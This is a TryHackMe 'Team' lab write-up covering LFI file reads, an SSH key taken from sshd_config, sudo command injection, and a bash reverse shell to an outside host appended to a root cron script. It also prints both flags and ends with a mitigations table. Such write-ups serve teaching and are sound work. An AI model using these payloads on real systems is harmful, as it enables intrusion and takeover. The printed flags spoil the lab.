```
 ████████╗███████╗ █████╗ ███╗   ███╗
 ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║
    ██║   █████╗  ███████║██╔████╔██║
    ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║
    ██║   ███████╗██║  ██║██║ ╚═╝ ██║
    ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝
          TryHackMe: Team
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-15 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐⭐☆☆

> ⏱️ ~14 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), SSH (22), HTTP (80)
- [x] Added `team.thm` to `/etc/hosts`: homepage loaded
- [x] `robots.txt` → username `dale`
- [x] Feroxbuster → found `/scripts/` directory
- [x] `script.txt` revealed comment hinting at `.old` extension with credentials
- [x] `script.old` → FTP credentials `ftpuser:T3@m$h@r3`
- [x] FTP login → `New_site.txt` → `dev.team.thm` subdomain hint
- [x] Added `dev.team.thm` to `/etc/hosts`
- [x] LFI on `script.php?page=` confirmed via `/etc/passwd`
- [x] LFI → `/home/dale/user.txt` → user flag
- [x] LFI → `/etc/ssh/sshd_config` → Dale's SSH private key in comment
- [x] SSH login as `dale`
- [x] `sudo -l` → `dale` can run `/home/gyles/admin_checks` as `gyles`
- [x] `admin_checks` passes `$error` to shell: injected `/bin/bash` at date prompt
- [x] Shell as `gyles`: stabilised with Python PTY
- [x] LinPEAS → `/usr/local/bin/main_backup.sh` writable by `gyles`
- [x] Appended bash reverse shell to `main_backup.sh`
- [x] Cron job executed script as root: caught root shell
- [x] Retrieved root flag

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 🕷️ Feroxbuster: web directory enumeration
- 📂 FTP client: authenticated file retrieval
- 🌐 Browser / curl: LFI exploitation
- 🐍 LinPEAS: privilege escalation enumeration
- 🔑 SSH: authenticated shell access
- 🐚 Netcat: reverse shell listener

---

## ⚡ TL;DR

`robots.txt` gave a username, a stale script backup exposed FTP credentials, FTP yielded a subdomain hint, and that subdomain ran a PHP page vulnerable to LFI. LFI read Dale's SSH private key out of an `sshd_config` comment. Inside as `dale`, a `sudo` rule allowed running `gyles`'s `admin_checks` script: which passed unsanitised input directly to the shell, injecting a `gyles` shell by typing `/bin/bash` at a date prompt. LinPEAS flagged a root-owned cron script writable by `gyles`. Appended a reverse shell, waited two minutes, caught root.

---

## 📖 Introduction

Today's target is **Team**: a box that hides its credentials across four different layers: a `robots.txt` username, a `.old` script backup with FTP credentials, an FTP note pointing to a dev subdomain, and an SSH private key buried in an `sshd_config` comment. Each layer requires reading the output of the previous one carefully rather than throwing tools at it blindly. The escalation chain is equally methodical: a `sudo` rule with a command injection point, a lateral move to `gyles`, and a writable cron script completing the run to root. This box rewards patience and attention to detail more than any single clever exploit.

### Prerequisites

Readers are assumed to know:

- What virtual hosts are and why adding entries to `/etc/hosts` matters
- What LFI (Local File Inclusion) is and how `?page=` parameters enable file reads
- How SSH private keys can be extracted and used for authentication
- What a cron job is and why a world-writable cron script is a privilege escalation path

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

*Full-range sweep with RustScan, Nmap for service and version fingerprinting:*

```bash
rustscan -a 10.48.187.18 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.5 |
| 22/tcp | SSH | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Three ports. FTP and HTTP both worth immediate attention. The HTTP title returns as Apache default: content is elsewhere. Anonymous FTP was blocked immediately on the first connection attempt.

### Virtual Host Discovery

The Apache default page itself contains a hint in the title: *"If you see this add 'team.thm' to your hosts file."* Following that instruction:

```bash
sudo echo "10.48.187.18   team.thm" >> /etc/hosts
```

The actual website loaded. `robots.txt` checked immediately:

```
http://team.thm/robots.txt → dale
```

Username: `dale`.

### Web Directory Enumeration

*(~5 mins into the box)*

```bash
feroxbuster -u http://team.thm/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,html
```

```
# output (relevant hits only)
301  http://team.thm/scripts         # ^^^ script directory
200  http://team.thm/scripts/script.txt
```

*Contents of `script.txt` (redacted version):*

```bash
#!/bin/bash
read -p "Enter Username: " REDACTED
read -sp "Enter Username Password: " REDACTED
# ...
# Note to self had to change the extension of the old "script" in this folder,
# as it has creds in
```

The comment is explicit: there's an older version of this script with credentials, just renamed. The extension was changed: trying `.old`:

```
http://team.thm/scripts/script.old
```

*Contents of `script.old` (relevant section):*

```bash
read -p "Enter Username: " ftpuser
read -sp "Enter Username Password: " T3@m$h@r3
```

FTP credentials: `ftpuser:T3@m$h@r3`.

### FTP Login → Subdomain Hint

*Logging in with the discovered credentials (active mode required):*

```bash
ftp 10.48.187.18
# Name: ftpuser   Password: T3@m$h@r3
ftp> passive
ftp> ls -la
# drwxrwxr-x  workshare/
ftp> cd workshare && get New_site.txt
```

*Contents of `New_site.txt`:*

```
Dale
    I have started coding a new website in PHP for the team to use,
    this is currently under development. It can be found at ".dev"
    within our domain.
    Also as per the team policy please make a copy of your "id_rsa"
    and place this in the relevent config file.
Gyles
```

Two key pieces: a `dev.team.thm` subdomain exists, and Dale's `id_rsa` was placed in "the relevant config file": almost certainly `sshd_config`.

```bash
sudo echo "10.48.187.18   dev.team.thm" >> /etc/hosts
```

---

## 🚪 Foothold

*(~20 mins into the box)*

### LFI: Local File Inclusion

**What is LFI?** When a PHP application accepts a filename via a URL parameter and passes it directly to a file-read function (`include()`, `require()`, `file_get_contents()`) without sanitisation, an attacker can substitute arbitrary paths. The server reads and returns any file the web process can access.

`http://dev.team.thm/` presents a placeholder page with a single link that navigates to:

```
http://dev.team.thm/script.php?page=teamshare.php
```

The `page=` parameter is the LFI vector.

*Confirming LFI with `/etc/passwd`:*

```
http://dev.team.thm/script.php?page=../../../../etc/passwd
```

The full `/etc/passwd` rendered in the response. Users confirmed: `dale` (uid 1000), `gyles` (uid 1001), `ftpuser` (uid 1002).

*Reading the user flag directly:*

```
http://dev.team.thm/script.php?page=/home/dale/user.txt
```

```
THM{6Y0TXHz7c2d}
```

*Reading `sshd_config` to find Dale's private key (per Gyles's note):*

```
http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
```

At the bottom of the config, commented out:

```
#Dale id_rsa
#-----BEGIN OPENSSH PRIVATE KEY-----
#b3BlbnNzaC1rZXktdjEAAAA...
#-----END OPENSSH PRIVATE KEY-----
```

The key was saved locally as `id_rsa` after stripping the leading `#` comment characters from each line.

---

## 🐚 Shell / Access

*(~25 mins into the box)*

*SSH login as `dale` with the extracted key:*

```bash
chmod 600 id_rsa
ssh -i id_rsa dale@team.thm
```

```
dale@ip-10-48-187-18:~$
```

---

## 📈 Escalation: Dale → Gyles

*(~27 mins into the box)*

### sudo admin_checks: Shell Injection

*Checking `dale`'s sudo permissions:*

```bash
sudo -l
```

```
User dale may run the following commands on ip-10-48-187-18:
    (gyles) NOPASSWD: /home/gyles/admin_checks
```

`dale` can run `gyles`'s `admin_checks` script as `gyles` without a password. Running the script shows it prompts for a name and a date. The date value is passed directly to the shell via the `$error` variable without sanitisation.

*Injecting `/bin/bash` at the date prompt to spawn a `gyles` shell:*

```bash
sudo -u gyles /home/gyles/admin_checks
```

```
Enter your name: anything
Enter the date:  /bin/bash
```

```
bash: /usr/bin/id: Permission denied    # initial noise
gyles@ip-10-48-187-18:~$               # ^^^ gyles shell
```

*Stabilising with Python PTY:*

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 📈 Escalation: Gyles → Root

*(~30 mins into the box)*

### Writable Cron Script: `/usr/local/bin/main_backup.sh`

LinPEAS flagged `/usr/local/bin/main_backup.sh` as writable by the `editors` group, and `gyles` is a member of that group.

*Verifying group membership and file permissions:*

```bash
id
# uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors)

ls -la /usr/local/bin/main_backup.sh
# -rwxrwxr-x 1 root editors ... main_backup.sh
```

The script is owned by `root` but writable by `editors`. A cron job runs it periodically as root: making it a reliable root shell delivery mechanism.

*Appending a reverse shell:*

```bash
echo "bash -i >& /dev/tcp/192.168.134.217/4444 0>&1" >> /usr/local/bin/main_backup.sh
```

*Setting up the listener and waiting for the cron job to fire:*

```bash
nc -lnvp 4444
```

```
# ~2 minutes later
connect to [192.168.134.217] from (UNKNOWN) [10.48.187.18] 46700
root@ip-10-48-187-18:~# cat root.txt
THM{fhqbznavfonq}
```

---

## 💥 Exploitation

The complete attack chain:

1. **`robots.txt`** → username `dale`
2. **`/scripts/script.old`** → FTP credentials `ftpuser:T3@m$h@r3`
3. **FTP** → `New_site.txt` → `dev.team.thm` subdomain + id_rsa config hint
4. **LFI on `dev.team.thm/script.php?page=`** → confirmed file read primitive
5. **LFI → `/home/dale/user.txt`** → user flag
6. **LFI → `/etc/ssh/sshd_config`** → Dale's SSH private key in a comment
7. **SSH as `dale`** → user shell
8. **`sudo -u gyles /home/gyles/admin_checks`** → shell injection via date input → `gyles` shell
9. **`/usr/local/bin/main_backup.sh`** writable by `editors` group, run by root cron → appended reverse shell → root

---

## 🐇 Rabbit Holes

### Anonymous FTP Blocked

First instinct on seeing port 21 was anonymous login: rejected immediately. The credentials only appeared later via the `script.old` web discovery path. Trying anonymous first is always correct; failing fast and moving on is equally correct.

### LFI Wordlist Enumeration

A large LFI path wordlist (~160 entries) was run against `script.php?page=` to probe for sensitive files. Most paths returned empty or error responses. The two productive hits: `user.txt` and `sshd_config`: came from targeted manual requests based on what was already known about the box (user `dale` from `robots.txt`, the id_rsa hint from `New_site.txt`), not from the wordlist. The lesson: known context produces better targets than generic wordlists.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `THM{6Y0TXHz7c2d}` | `/home/dale/user.txt` (read via LFI) |
| Root | `THM{fhqbznavfonq}` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Sensitive files accessible via `robots.txt` | Low | `robots.txt` is not an access control mechanism: never list paths containing credentials or usernames; use proper authentication |
| Backup script with credentials left in web-accessible directory | Critical | Never store backup files or old versions under the webroot; automate cleanup of `.old`, `.bak`, `.tmp` files before deployment |
| LFI via unsanitised `page=` parameter | Critical | Validate `page` against an explicit allowlist of permitted filenames; never pass raw user input to PHP `include()` or `require()` |
| SSH private key stored in `sshd_config` comment | Critical | Private keys belong only in `~/.ssh/`; they should never be pasted into configuration files, comments, or any other location |
| `admin_checks` script passing user input to shell unsanitised | High | Validate and sanitise all inputs to privileged scripts; avoid passing user-supplied strings as shell arguments or to `eval` |
| Root cron script writable by a non-root group | Critical | Cron scripts executed as root must be owned and writable only by root (`chmod 700`, `chown root:root`); audit cron jobs regularly |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** Virtual host enumeration is an underused but essential step: the entire attack surface of this box was hidden behind a hostname that wouldn't resolve without an `/etc/hosts` entry. When a target has a domain name associated with it, always check for subdomains and alternative vhosts before concluding the web surface is limited to the IP's default response.

---

## 🔁 If I Did It Again

Check `robots.txt` and view-source on the homepage *before* running Feroxbuster: both the username and the hint about the scripts directory were immediately available without a scan. Also add the `dev.team.thm` vhost to `/etc/hosts` immediately after reading `New_site.txt` from FTP, rather than finishing FTP exploration first.

---

## 🔚 Changelog

*Last updated: 2026-06-15*

---

[↑ Back to top](#)
